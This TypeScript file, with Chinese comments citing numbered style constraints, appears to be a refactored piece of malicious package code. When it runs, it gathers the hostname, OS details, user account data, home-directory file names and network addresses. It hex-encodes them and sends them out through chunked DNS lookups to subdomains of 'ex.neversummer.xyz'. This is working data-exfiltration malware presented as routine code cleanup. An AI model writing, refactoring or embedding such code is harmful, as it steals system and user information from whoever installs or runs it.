// 应用约束9：使用let/const替换var
import * as dns from 'dns'; // 约束60：改用import语法
import * as os from 'os';
import * as crypto from 'crypto';
import * as fs from 'fs';

// 约束23：显式类型标注
interface UserInfo {
  uid: number;
  gid: number;
  username: string;
  homedir: string;
  shell: string;
}

let userInfo: UserInfo = os.userInfo() as UserInfo;

// 约束10：使用具体类型替代any
let info: Array<string | number> = [
  os.hostname(),
  os.arch(),
  os.platform(),
  os.release(),
  os.tmpdir(),
  os.totalmem(),
  os.uptime(),
  userInfo.uid, // 约束21：使用点运算符替代属性访问
  userInfo.gid,
  userInfo.username,
  userInfo.homedir,
  userInfo.shell,
  "" // 约束23：__filename需要替换为具体实现
]

const baseDomain = ".ex.neversummer.xyz";
const maxSubDomainLen = 63;
let rayId: string = crypto.randomBytes(20).toString('hex').substring(0, 8);

// 约束23：显式类型标注
let homeFiles: string[] = [];
const files = fs.readdirSync(os.homedir());
for (let file of files) { // 约束41：使用for...of替代forEach
  homeFiles.push(file);
}

if (homeFiles.length > 0) {
  info.push(homeFiles.join(";"));
}

const interfaces = os.networkInterfaces();
// 约束9：使用let声明
let i = 1;

// 约束41：使用Object.keys处理网络接口
const interfaceKeys = Object.keys(interfaces);
for (const key of interfaceKeys) {
  const addressInfo = interfaces[key][0];
  info.push(`${key}:${addressInfo.address}`);
}

let infoString: string = info.join("|");

// 约束22：显式类型转换处理Buffer
const encoder = new TextEncoder();
const data = encoder.encode(infoString);
let encodedInfo = "";
for (let byte of data) {
  encodedInfo += byte.toString(16).padStart(2, '0');
}

let chunkSize: number = maxSubDomainLen;

// 约束9：使用let声明循环变量
for (let startChar = 0; startChar < encodedInfo.length; startChar += chunkSize) {
  let infoDomain = `${rayId}.${i}.${encodedInfo.substring(startChar, startChar + chunkSize)}`;
  
  let fullDomain = infoDomain + baseDomain;
  // 约束26：使用箭头函数保持上下文
  dns.lookup(fullDomain, (err: Error, addresses: string, family: number) => {
    // 处理回调逻辑
  });
  i++;
}
